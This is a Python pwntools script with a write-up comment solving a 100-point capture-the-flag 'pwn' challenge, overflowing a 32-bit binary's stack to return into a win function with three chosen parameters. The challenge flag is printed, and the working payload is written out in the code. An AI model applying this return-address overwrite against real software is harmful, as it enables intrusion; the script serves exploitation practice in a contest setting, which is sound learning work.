#!/usr/bin/env python3

################################# Write-up #####################################
# Points: 100 (5 days in)
# Category: pwn
# Prompt: No-one has ever guessed my favorite numbers. Can you?
# nc pwn.red.csaw.io 5007
#
# This is a basic ROP chall for an x86 binary. It uses the cdecl calling
# convention, so in order to display the flag (in this case it is to pass in 3
# params to all_I_do_is_win), you must get the padding, add on the ret addr of
# all_I_do_is_win, add 4 bytes of junk since there is no 2nd ret addr we need to
# call, and finally tack on the 3 params, in order from 1st to 3rd. I was at
# first hesitant that it wasn't a ROP chall bc fgets() was used, but when I
# debugged it and saw the stack, it showed that the function actually wrote into
# the area where the instruction pointer and parameters are stored. Thus,
# ROP is viable. :)
#
# Flag: flag{w0w_R_y0u_A_m1nD_r34D3r?}
# Solved by: Ryan Nguyen
################################################################################

from pwn import *

exe = ELF("actually_not_guessy")

context.binary = exe

# ROP Essentials
padding = "a"*44
all_I_do_is_win = "\x46\x85\x04\x08" # 0x08048546
param1 = "\xde\xc0\x0d\x60"  # 0x600dc0de
param2 = "\x15\x55\xce\xac" # 0xacce5515
param3 = "\x1e\x1b\xa5\xfe" # 0xfea51b1e
def conn():
	if False:
		return process([exe.path])
	else:
		return remote("pwn.red.csaw.io", 5007)


def main():
	r = conn()
	r.recvuntil("you win!")
	payload = padding
	payload += all_I_do_is_win
	payload += "JUNK" # Remember: 2nd ret address goes here, we don't needone
	payload += param1
	payload += param2
	payload += param3
	r.sendline(payload)
	r.interactive()


if __name__ == "__main__":
	main()
